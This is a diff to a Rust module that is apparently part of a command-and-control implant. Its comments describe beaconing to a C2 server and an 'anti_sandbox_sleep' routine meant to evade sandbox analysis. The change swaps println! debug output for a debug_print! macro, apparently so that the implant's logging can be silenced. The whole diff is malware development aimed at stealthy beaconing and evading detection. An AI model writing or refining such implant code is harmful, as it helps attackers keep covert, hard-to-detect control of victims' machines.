@@ -21,6 +21,9 @@
 use std::time::{Duration, SystemTime};
 use std::thread;
 
+// Import the debug_print macro from the crate
+use crate::debug_print;
+
 /// Beacon configuration for C2 communication timing.
 ///
 /// Controls how frequently the agent checks in with the C2 server and
@@ -223,7 +226,7 @@ pub fn beacon_sleep(duration: Duration) {
     // interrupciones más rápidas si es necesario en el futuro
     let total_secs = duration.as_secs();
     
-    println!("DEBUG: [BEACON] Durmiendo {} segundos...", total_secs);
+    debug_print!("DEBUG: [BEACON] Durmiendo {} segundos...", total_secs);
     
     // Dormir en chunks de 5 segundos
     let chunks = total_secs / 5;
@@ -256,7 +259,7 @@ pub fn beacon_sleep(duration: Duration) {
 /// anti_sandbox_sleep(60);  // Sleeps for 60 seconds in random chunks
 /// ```
 pub fn anti_sandbox_sleep(total_seconds: u64) {
-    println!("DEBUG: [BEACON] Anti-sandbox sleep de {} segundos", total_seconds);
+    debug_print!("DEBUG: [BEACON] Anti-sandbox sleep de {} segundos", total_seconds);
     
     let mut remaining = total_seconds;
     
